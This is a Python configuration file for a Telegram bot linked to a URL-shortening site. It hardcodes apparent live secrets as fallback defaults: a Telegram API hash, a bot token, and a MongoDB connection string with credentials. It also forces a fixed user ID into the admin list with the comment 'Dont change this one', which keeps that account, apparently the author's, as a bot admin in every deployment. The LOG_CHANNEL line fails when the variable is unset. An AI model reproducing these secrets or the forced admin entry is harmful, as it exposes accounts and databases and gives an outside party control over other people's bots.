import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
BASE_SITE = os.environ.get("BASE_SITE", "runurl.in")

API_ID = int(os.environ.get("API_ID", "25695562"))
API_HASH = os.environ.get("API_HASH", "0b691c3e86603a7e34aae0b5927d725a")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7083722060:AAEp1Ec33BYPaHiVNZsTZWoe3U251JtuXsA")

DATABASE_NAME = os.environ.get("DATABASE_NAME", "runurl")
DATABASE_URL = os.environ.get("DATABASE_URL", "mongodb+srv://pabagav476aersmcom:pabagav476aersmcom@cluster0.5jd4dlx.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")

OWNER_ID =  int(os.environ.get("OWNER_ID", "1895952308"))
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split(",")] if os.environ.get("ADMINS") else [] #Keep this empty otherwise bot will not work for owner.
ADMIN = ADMINS
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(1895952308) #Dont change this one.

#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "")) 
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True")
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", 'https://telegra.ph/file/19eeb26fa2ce58765917a.jpg')
LINK_BYPASS = "True" 


"""
Author: StupidBoi
Telegram: https://t.me/StupidBoi69
"""
